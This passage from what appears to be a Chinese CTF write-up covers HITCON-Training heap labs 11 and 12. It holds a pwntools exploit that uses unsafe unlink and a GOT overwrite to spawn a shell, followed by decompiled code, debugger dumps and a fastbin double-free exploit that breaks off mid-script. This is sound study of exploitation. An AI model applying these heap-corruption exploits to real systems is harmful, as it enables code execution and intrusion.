class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./bamboobox\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./bamboobox\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size, name)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice:\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"name:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"item:\"</span>)</span><br><span class=\"line\">\tp.sendline(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice:\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"item:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice:\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(index, size, name)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice:\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">'3'</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"item:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"name:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"item:\"</span>)</span><br><span class=\"line\">\tp.send(name)</span><br><span class=\"line\">itemlist = <span class=\"number\">0x6020c0</span></span><br><span class=\"line\">one_gadget = <span class=\"number\">0xf02a4</span></span><br><span class=\"line\"></span><br><span class=\"line\">ptr = itemlist + <span class=\"number\">0x8</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"a\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>, <span class=\"string\">\"b\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"c\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">payload = p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x61</span>) + p64(ptr - <span class=\"number\">0x18</span>) + p64(ptr - <span class=\"number\">0x10</span>)</span><br><span class=\"line\">payload += (<span class=\"number\">0x60</span> - <span class=\"number\">0x20</span>) * <span class=\"string\">\"a\"</span> + p64(<span class=\"number\">0x60</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, len(payload), payload)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">\"b\"</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0xa0</span>) + p64(<span class=\"number\">0x90</span>)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>, len(payload), payload)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">atoi_got = elf.got[<span class=\"string\">'atoi'</span>]</span><br><span class=\"line\"><span class=\"comment\"># now ptr = 0x6020b0</span></span><br><span class=\"line\">payload = p64(<span class=\"number\">0</span>) * <span class=\"number\">2</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>) + p64(atoi_got)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, len(payload), payload)</span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">addr = u64(p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">\"\\x00\"</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">libc.address = addr - libc.symbols[<span class=\"string\">'atoi'</span>]</span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">payload = p64(one_gadget + libc.address)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, len(payload), payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"any\"</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab12——secretgarden\"><a href=\"#Lab12——secretgarden\" class=\"headerlink\" title=\"Lab12——secretgarden\"></a>Lab12——secretgarden</h2><h3 id=\"防护-2\"><a href=\"#防护-2\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>和Lab11类似，也没有开启pie。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab12$ checksec secretgarden</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab12/secretgarden&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-2\"><a href=\"#分析-2\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>主要功能有add, visit, del和clean。</p>\n<h4 id=\"add\"><a href=\"#add\" class=\"headerlink\" title=\"add\"></a>add</h4><p>这里我们通过逆向得到flower结构体的结构为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct flower&#123;</span><br><span class=\"line\">\t+0x0 DWORD inuse; // 初始化之后会置为1</span><br><span class=\"line\">  +0x8 char* name;</span><br><span class=\"line\">  +0x10 char[24] color; // 通过scanf（&quot;%23s&quot;）输入，说明至少为23位</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>add函数中，首先判断flowercount是否大于0x63，是则直接退出。然后malloc一个0x28的chunk，并均初始化为0。然后用scanf读入name的长度，这里检查长度size不为-1，防止整数溢出。然后malloc(size)的chunk，再读入name和color。最后会存储在flowerlist上，并将flowercount自增1</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">add</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v0; <span class=\"comment\">// rsi</span></span><br><span class=\"line\">  <span class=\"keyword\">size_t</span> size; <span class=\"comment\">// [rsp+0h] [rbp-20h]</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *s; <span class=\"comment\">// [rsp+8h] [rbp-18h]</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *buf; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  s = <span class=\"number\">0L</span>L;</span><br><span class=\"line\">  buf = <span class=\"number\">0L</span>L;</span><br><span class=\"line\">  LODWORD(size) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)flowercount &gt; <span class=\"number\">0x63</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"The garden is overflow\"</span>);</span><br><span class=\"line\">  s = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x28</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(s, <span class=\"number\">0</span>, <span class=\"number\">0x28</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Length of the name :\"</span>, <span class=\"number\">0L</span>L, size);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)__isoc99_scanf(<span class=\"string\">\"%u\"</span>, &amp;size) == <span class=\"number\">-1</span> )</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">  buf = <span class=\"built_in\">malloc</span>((<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)size);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !buf )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Alloca error !!\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"The name of flower :\"</span>, size);</span><br><span class=\"line\">  v0 = buf;</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)size);</span><br><span class=\"line\">  *((_QWORD *)s + <span class=\"number\">1</span>) = buf;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"The color of the flower :\"</span>, v0, size);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">\"%23s\"</span>, (<span class=\"keyword\">char</span> *)s + <span class=\"number\">16</span>);</span><br><span class=\"line\">  *(_DWORD *)s = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( HIDWORD(size) = <span class=\"number\">0</span>; HIDWORD(size) &lt;= <span class=\"number\">0x63</span>; ++HIDWORD(size) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !*(&amp;flowerlist + HIDWORD(size)) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      *(&amp;flowerlist + HIDWORD(size)) = s;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  ++flowercount;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"Successful !\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"del\"><a href=\"#del\" class=\"headerlink\" title=\"del\"></a>del</h4><p>会根据输入的index，将对应flowerlist中的flower结构体的inuse置为0，然后free掉name的chunk，注意这里存在uaf漏洞，而且没有free flower结构体堆块</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">del</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> result; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v1; <span class=\"comment\">// [rsp+4h] [rbp-Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v2; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !flowercount )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"No flower in the garden\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Which flower do you want to remove from the garden:\"</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;v1);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &lt;= <span class=\"number\">0x63</span> &amp;&amp; *(&amp;flowerlist + v1) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    *(_DWORD *)*(&amp;flowerlist + v1) = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(*((<span class=\"keyword\">void</span> **)*(&amp;flowerlist + v1) + <span class=\"number\">1</span>));</span><br><span class=\"line\">    result = <span class=\"built_in\">puts</span>(<span class=\"string\">\"Successful\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Invalid choice\"</span>);</span><br><span class=\"line\">    result = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"clean\"><a href=\"#clean\" class=\"headerlink\" title=\"clean\"></a>clean</h4><p>判断对应flower的chunk不为null且inuse标记为0，就free掉flower结构体，然后将flowercount自减1。也就是说，这个函数没有free flower的name的堆块。理论上应该先调用del，再调用clean。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">clean</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> i; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">0x63</span>; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( *(&amp;flowerlist + i) &amp;&amp; !*(_DWORD *)*(&amp;flowerlist + i) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">free</span>(*(&amp;flowerlist + i));</span><br><span class=\"line\">      *(&amp;flowerlist + i) = <span class=\"number\">0L</span>L;</span><br><span class=\"line\">      --flowercount;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"Done!\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"visit\"><a href=\"#visit\" class=\"headerlink\" title=\"visit\"></a>visit</h4><p>根据对应flowerlist上对应chunk的inuse位，若inuse位不为0，则输出name和color。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">visit</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  __int64 v0; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> i; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  LODWORD(v0) = flowercount;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( flowercount )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">0x63</span>; ++i )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v0 = (__int64)*(&amp;flowerlist + i);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v0 )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        LODWORD(v0) = *(_DWORD *)*(&amp;flowerlist + i);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( (_DWORD)v0 )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">printf</span>(<span class=\"string\">\"Name of the flower[%u] :%s\\n\"</span>, i, *((_QWORD *)*(&amp;flowerlist + i) + <span class=\"number\">1</span>));</span><br><span class=\"line\">          LODWORD(v0) = <span class=\"built_in\">printf</span>(<span class=\"string\">\"Color of the flower[%u] :%s\\n\"</span>, i, (<span class=\"keyword\">char</span> *)*(&amp;flowerlist + i) + <span class=\"number\">16</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    LODWORD(v0) = <span class=\"built_in\">puts</span>(<span class=\"string\">\"No flower in the garden !\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用-2\"><a href=\"#利用-2\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>该题目程序功能比较复杂，但是主要漏洞在于对堆块是否被释放的管理逻辑有误。del函数会将指定index的chunk的<em>inuse置0</em>，并且将对应的name chunk free掉，但是没有free 指定index的chunk本身。clean函数会将所有inuse位不为0且不为null的chunk free掉。而visit函数会根据inuse位是否为1来决定是否输出对应信息。</p>\n<p>注意，该题由于没有setvbuf，所以需要先调用一次add函数将缓冲区申请出来。</p>\n<p>注意到，该题在调用del之后，如果不调用clean，将不会从全局数组上删除对应chunk指针，所以存在潜在的double free漏洞。在此构造一个fastbin 2free，实现任意地址分配。</p>\n<p>一般来说，通过inuse这种方式判断是否可以free是不安全的，一般都可能存在2free漏洞。</p>\n<p>这里要实现任意地址分配，需要控制size。我们需要在想改的got表覆盖找一个地址，size在fastbin范围内，在got表前面一个byte一个byte的查看字节偏移，找到0x601fffa为合适的地址</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  x/32gx 0x601ffa</span><br><span class=\"line\">0x601ffa:\t0x1e28000000000000\t0x0168000000000060</span><br><span class=\"line\">0x60200a:\t0x0ee000007fd5662b\t0x34f000007fd5660a</span><br><span class=\"line\">0x60201a &lt;free@got.plt+2&gt;:\t0xe69000007fd565d4\t0x07b600007fd565d2</span><br><span class=\"line\">0x60202a &lt;__stack_chk_fail@got.plt+2&gt;:\t0x4800000000000040\t0x197000007fd565d1</span><br><span class=\"line\">0x60203a &lt;memset@got.plt+2&gt;:\t0xb20000007fd565e3\t0x68e000007fd565d8</span><br><span class=\"line\">0x60204a &lt;close@got.plt+2&gt;:\t0x625000007fd565db\t0xf74000007fd565db</span><br><span class=\"line\">0x60205a &lt;__libc_start_main@got.plt+2&gt;:\t0x43c000007fd565cd\t0x313000007fd565cf</span><br><span class=\"line\">0x60206a &lt;malloc@got.plt+2&gt;:\t0xee7000007fd565d4\t0x603000007fd565d2</span><br><span class=\"line\">0x60207a &lt;open@got.plt+2&gt;:\t0x5e8000007fd565db\t0xa4d000007fd565cf</span><br><span class=\"line\">0x60208a &lt;__isoc99_scanf@got.plt+2&gt;:\t0x088600007fd565d2\t0x0000000000000040</span><br><span class=\"line\">0x60209a:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x6020aa:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x6020ba:\t0x4620000000000000\t0x000000007fd56608</span><br><span class=\"line\">0x6020ca:\t0x0000000000030000\t0x0000000000000000</span><br><span class=\"line\">0x6020da:\t0x4010000000000000\t0x507000000000017f</span><br><span class=\"line\">0x6020ea &lt;flowerlist+10&gt;:\t0x50c000000000017f\t0x000000000000017f</span><br></pre></td></tr></table></figure>\n<p>由fastbin数组索引计算的宏定义可知，高四位不影响size的大小。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#define fastbin_index(sz) \\</span><br><span class=\"line\">\t((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br></pre></td></tr></table></figure>\n<p>在分配到该位置后，复写got表即可实现利用，exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./secretgarden\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./secretgarden\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size, name, color)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"name :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"flower :\"</span>)</span><br><span class=\"line\">\tp.send(name)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"flower :\"</span>)</span><br><span class=\"line\">\tp.sendline(color)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">visit</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">del_</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"garden:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">clean</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">magic = <span class=\"number\">0x400c7b</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, <span 